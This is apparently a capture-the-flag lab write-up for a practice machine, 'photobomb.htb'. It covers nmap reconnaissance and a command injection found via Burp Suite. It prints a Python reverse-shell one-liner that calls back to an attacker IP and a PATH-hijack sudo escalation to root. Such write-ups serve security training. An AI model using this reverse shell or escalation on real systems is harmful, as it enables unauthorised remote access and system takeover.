```bash
└─$ sudo nmap -sC -sV 10.10.11.182
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-11 17:20 EST
Nmap scan report for 10.10.11.182
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.38 seconds
```

```bash
nano /etc/hosts
```

![[Pasted image 20221211192733.png]]

![[Pasted image 20221211192921.png]]

Just fooling around, I decided to click on the *click here* link:

![[Pasted image 20221211193036.png]]

Obviously I did not have any username and password, so I thought about checking the source-code for any hints

![[Pasted image 20221211193506.png]]

By checking the .js code you're gonna find the following page:

![[Pasted image 20221211193721.png]]

![[Pasted image 20221211193739.png]]

And this is what you see after clicking 'ok'

![[Pasted image 20221211193817.png]]

After that I got my burp suite up and running... After a few tries, I got a successfull command injection, so I used revshells.com to get a reverse shell code:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.134",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

And used it in my request 

![[Pasted image 20221211200225.png]]

And there you go, user flag *cheeeck*!

Now, for the root flag I used the following commands:

```bash
sudo -l

$ cat /opt/cleanup.sh
$ echo bash > find
$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

Once you're root, just go to the default directory and get your root flag!
